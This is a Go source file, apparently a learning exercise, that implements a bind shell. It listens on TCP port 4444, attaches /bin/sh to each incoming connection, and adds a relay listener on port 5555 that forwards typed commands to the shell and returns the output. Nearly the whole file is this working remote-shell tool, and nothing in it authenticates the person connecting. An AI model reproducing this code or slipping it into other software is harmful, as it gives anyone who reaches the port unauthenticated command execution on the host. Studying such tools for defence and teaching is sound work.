package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"os/exec"
	"time"
)

func bhandleConnection(connection net.Conn) {
	fmt.Printf("received connection from %v\n", connection.RemoteAddr().String()) //RemoteAddr refers to the machine connecting to the listener, while LocalAddr refers to the address/port of the listener itself

	_, err := connection.Write([]byte("connection successful, bash session over tcp initiated\n")) //convert the string to a byte slice and send it over the connection
	if err != nil {
		fmt.Println("Something went wrong trying to write to the connection:", err)
	}

	cmd := exec.Command("/bin/sh")
	cmd.Stdin = connection //connection pointer is dereferenced to retrieve the connection data
	cmd.Stdout = connection
	cmd.Stderr = connection

	cmd.Run()
}

func newbindshell() {
	var listenPort string = "4444"
	listener, err := net.Listen("tcp", "localhost:"+listenPort) //starts a listener on tcp port 4444

	if err != nil {
		fmt.Printf("An error occurred while initializing the listener on %v: %v\n", listenPort, err)
	} else {
		fmt.Println("listening on tcp port " + listenPort + "...")
	}

	//By removing this loop, you could have the program mimic netcat and end after one connection completes
	for {
		connection, err := listener.Accept() //waits for and returns the next connection to the listener
		if err != nil {
			fmt.Printf("An error occurred during an attempted connection: %v\n", err)
		}

		go bhandleConnection(connection) //go handle the connection concurrently in a goroutine
	}
}

func newhandleConnection(connection1 net.Conn, connection2 net.Conn) {

	//read input from standard in
	println("new connection")
	reader := bufio.NewReader(connection2)
	text, _ := reader.ReadString('\n')

	fmt.Print("Text to send: ", text)

	//write input to tcp socket
	fmt.Fprintf(connection1, text+"\n") //formats and writes to a given io.Writer object, in this case the connection

	err := connection1.SetReadDeadline(time.Now().Add(2 * time.Second))
	if err != nil {
		log.Println("SetReadDeadline failed:", err)
		// do something else, for example create new conn
		return
	}
	recvBuf := make([]byte, 1024)
	_, err = connection1.Read(recvBuf[:]) // recv data
	if err != nil {
		if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
			connection2.Write([]byte(""))
			// time out
		} else {
			log.Println("read error:", err)
			// some error else, do something else, for example create new conn
		}
	}

	//message, _ := bufio.NewReader(connection1).ReadString('\n') //waits and receives a reply from the server
	//fmt.Print("Message from server: " + message)
	fmt.Print("message is: ", string(recvBuf))
	connection2.Write(recvBuf)

	//_, err := connection2.Write([]byte("connection successful, " +
	//	"bash session over tcp initiated\n")) //convert the string to a byte slice and send it over the connection
	//if err != nil {
	//	fmt.Println("Something went wrong trying to write to the connection:", err)
	//}

}

func main() {
	go newbindshell()
	time.Sleep(3 * time.Second)
	var tcpPort string = "4444"
	connection1, err := net.Dial("tcp", "127.0.0.1:"+tcpPort) //connect to the socket
	if err != nil {
		fmt.Println("An error occurred trying to connect to the target:", err)
	}
	//receive reply from server and print
	message, _ := bufio.NewReader(connection1).ReadString('\n') //waits and receives a reply from the server
	//fmt.Print("Message from server: " + message)
	fmt.Print(message)

	// bind shell
	var listenPort string = "5555"
	listener, err := net.Listen("tcp", "localhost:"+listenPort) //starts a listener on tcp port 4444

	if err != nil {
		fmt.Printf("An error occurred while initializing the listener on %v: %v\n", listenPort, err)
	} else {
		fmt.Println("listening on tcp port " + listenPort + "...")
	}

	//By removing this loop, you could have the program mimic netcat and end after one connection completes
	for {
		connection2, err := listener.Accept() //waits for and returns the next connection to the listener
		if err != nil {
			fmt.Printf("An error occurred during an attempted connection: %v\n", err)
		}

		go newhandleConnection(connection1, connection2) //go handle the connection concurrently in a goroutine
	}

}
